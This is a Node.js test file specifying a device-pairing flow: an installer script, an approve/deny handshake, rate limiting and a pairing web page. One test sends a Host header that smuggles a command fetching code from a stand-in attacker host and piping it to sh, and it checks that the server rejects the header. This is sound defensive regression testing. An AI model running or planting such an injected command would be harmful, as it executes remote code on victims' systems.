import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { bootServer, type TestServer } from "./server-harness.js";

/* SPEC-TESTS for interactive pairing — https://github.com/roowus/truss/issues/111
   ("When adding a device even the sent-to-device command is so long —
   installing claude is just `install claude` then `claude`. Make it as
   simple as possible, use the existing tailscale connection.").

   The contract evolved with the owner's review rounds. The issue's pinned
   v1 shape (script prompts for a 4-char code, POST /i/redeem redeems it)
   shipped, then review drove it to the WhatsApp/Discord shape: the
   installer announces the device and the trust decision is the Allow click
   on the surface the user is already at — no code, no typing, no prompt.
   The /i/redeem endpoint died with the prompt (nothing consumed it).

   The contract now:
   1. GET /i (no code) → a shell script that (a) announces the device at
      POST /api/pair/request, (b) polls the request until the UI decides,
      (c) contains NO token and no code, (d) passes sh -n.
   2. The pairing handshake: POST /api/pair/request → 202 { id } (rate
      limited); GET /api/pair/request/<id> → pending until the UI's
      approve/deny; the approved read hands { hostId, token, serverUrl }
      exactly once, then 410; unknown/consumed ids 410 (no oracle);
      denied stays answerable until expiry; /api/hosts carries the
      pendingPair list the UI renders. */

let srv: TestServer;
before(async () => {
  srv = await bootServer("pair-interactive");
});
after(async () => {
  await srv.close();
});

const postJson = (path: string, body: unknown) =>
  fetch(`${srv.base}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });

test("GET /i (no code) serves the auto-pairing installer: announces, polls for approval, carries no token", async () => {
  const res = await fetch(`${srv.base}/i`);
  assert.equal(res.status, 200, "the bare /i route exists (once upon a time it fell through to the SPA)");
  const body = await res.text();
  assert.match(res.headers.get("content-type") ?? "", /shellscript|x-sh|plain/i, "it's a script, not the app html");
  assert.ok(!body.includes("<!doctype html") && !body.includes("<html"), "NOT the SPA fallback");
  assert.match(body, /\/api\/pair\/request/, "the script announces itself for pairing");
  assert.match(body, /pair\/request\/\$ID/, "and polls the request until the UI decides");
  assert.match(body, /Allow/, "it tells the user where the approval happens");
  assert.ok(!/read .*code|code\?/i.test(body), "no code prompt survives — the Allow click replaced it");
  assert.ok(!/truss_agent_[0-9a-f]{10,}/.test(body), "no token is ever baked into the generic script");
  const syntax = spawnSync("sh", ["-n"], { input: body, encoding: "utf8" });
  assert.equal(syntax.status, 0, `sh -n parses it clean: ${syntax.stderr.slice(0, 120)}`);
});

test("the auto-pair handshake: request → pending in /api/hosts → approve → credentials exactly once", async () => {
  const ping = await fetch(`${srv.base}/api/pair/ping`).then((r) => r.json());
  assert.equal(ping.name, "truss", "the discovery probe identifies a Truss server");

  const created = await postJson("/api/pair/request", { hostname: "testbox", os: "linux", tailscaleIp: "100.64.0.9" });
  assert.equal(created.status, 202, "the request is accepted, not granted — approval is pending");
  const { id } = await created.json();
  assert.match(id, /^[0-9a-f]{32}$/, "unguessable request id");

  const pending = await fetch(`${srv.base}/api/pair/request/${id}`).then((r) => r.json());
  assert.equal(pending.status, "pending", "waiting for the Allow click");

  const roster = await fetch(`${srv.base}/api/hosts`).then((r) => r.json());
  const listed = roster.pendingPair.find((p: { id: string }) => p.id === id);
  assert.ok(listed, "the pending request rides the hosts roster the UI already polls");
  assert.equal(listed.hostname, "testbox");
  /* audit round 9 (B2): the one field on the Allow row the device did NOT
     make up must survive the route into the roster */
  assert.equal(listed.sourceIp, "127.0.0.1", "the requester's real source address reaches the UI");
  assert.ok(!("token" in listed), "the pending view never carries credentials");

  const approved = await postJson(`/api/pair/request/${id}/approve`, {});
  assert.equal(approved.status, 200, JSON.stringify(await approved.clone().text()));
  const { hostId } = await approved.json();
  assert.ok(hostId, "approving creates the host");

  const once = await fetch(`${srv.base}/api/pair/request/${id}`);
  assert.equal(once.status, 200);
  const payload = await once.json();
  assert.equal(payload.status, "approved");
  assert.equal(payload.hostId, hostId);
  assert.match(payload.token, /^truss_agent_[0-9a-f]+$/, "the agent token for the env file");
  assert.equal(payload.serverUrl, srv.base, "the dial-home address is the one the agent reached us at");

  const twice = await fetch(`${srv.base}/api/pair/request/${id}`);
  assert.equal(twice.status, 410, "the credentials are delivered exactly once");

  const hosts = await fetch(`${srv.base}/api/hosts`).then((r) => r.json());
  assert.ok(hosts.hosts.some((h: { id: string; label: string }) => h.id === hostId && h.label === "testbox"), "the approved device is a host now");
  assert.ok(!hosts.pendingPair.some((p: { id: string }) => p.id === id), "and no longer pending");

  const ghost = await fetch(`${srv.base}/api/pair/request/${"0".repeat(32)}`);
  assert.equal(ghost.status, 410, "unknown ids die the same way (no oracle)");
});

test("deny answers the poll honestly; creation is rate-limited per client", async () => {
  const r2 = await postJson("/api/pair/request", { hostname: "denybox", os: "linux" }).then((r) => r.json());
  const denied = await postJson(`/api/pair/request/${r2.id}/deny`, {});
  assert.equal(denied.status, 200);
  const poll = await fetch(`${srv.base}/api/pair/request/${r2.id}`).then((r) => r.json());
  assert.equal(poll.status, "denied", "the installer hears the no");

  const gone = await postJson(`/api/pair/request/${r2.id}/approve`, {});
  assert.equal(gone.status, 410, "a decided request cannot be re-approved");

  let last = 0;
  for (let i = 0; i < 4; i++) {
    last = (await postJson("/api/pair/request", { hostname: `flood${i}`, os: "linux" })).status;
  }
  assert.equal(last, 429, "the per-client budget guards the unauthenticated endpoint (5/min)");
});

/* audit round 1 (B1): /i embeds the client-controlled Host header in the
   served script — the assertSafeServerUrl choke point blocks the breakout
   today, but nothing failed if it regressed. Same pin as the sibling
   /agent/install.sh embed (delivery-dialable.test.ts): fetch forbids
   overriding Host, so go one level down (node:http). */
test("GET /i with a metacharacter Host header refuses to embed it (400)", async () => {
  const { get } = await import("node:http");
  const hostile = "x'; curl evil.example/p | sh #'";
  const { status, body } = await new Promise<{ status: number; body: string }>((res, rej) => {
    const req = get(`${srv.base}/i`, { headers: { host: hostile } }, (r) => {
      let b = "";
      r.on("data", (c) => (b += c));
      r.on("end", () => res({ status: r.statusCode ?? 0, body: b }));
    });
    req.on("error", rej);
  });
  assert.equal(status, 400, "a hostile Host must never reach the script");
  assert.ok(!body.includes("curl evil"), "nothing of the injection survives");
});

/* review rounds (issue #111): the browser half of the floor — /p is a static
   page whose Download button fetches the generic /i script under a FRESH
   random name (a browser that dedupes an earlier download to "t.sh (2)" left
   the static instruction pointing at the wrong file — found in manual test),
   and the page then shows the run command with that exact name. The
   handshake is the Allow click in the Truss UI; no code anywhere. */
test("GET /p serves the browser pairing page: download, run the exact-named file, approve", async () => {
  const res = await fetch(`${srv.base}/p`);
  assert.equal(res.status, 200, "the page exists");
  assert.match(res.headers.get("content-type") ?? "", /text\/html/, "a page, not a script");
  const body = await res.text();
  assert.ok(body.includes("<!doctype html"), "actually html");
  assert.match(body, /fetch\("\/i"\)/, "the Download button fetches the generic auto-pair script");
  assert.match(body, /truss-pair-/, "downloads get a fresh name per click");
  assert.match(body, /"sh ~\/Downloads\/" \+ name/, "the run command shows the exact downloaded name (dedup-proof)");
  assert.ok(!body.includes("aria-label=\"pairing code\""), "no code box — the Allow click replaced it");
  assert.match(body, /Allow/, "the page names the approval step");
  assert.ok(!/truss_agent_[0-9a-f]{10,}/.test(body), "the page is token-free like the /i script");

  const script = await fetch(`${srv.base}/i`);
  assert.match(script.headers.get("content-disposition") ?? "", /attachment; filename="t\.sh"/, "browsers that land on /i directly still download (curl ignores it)");
});
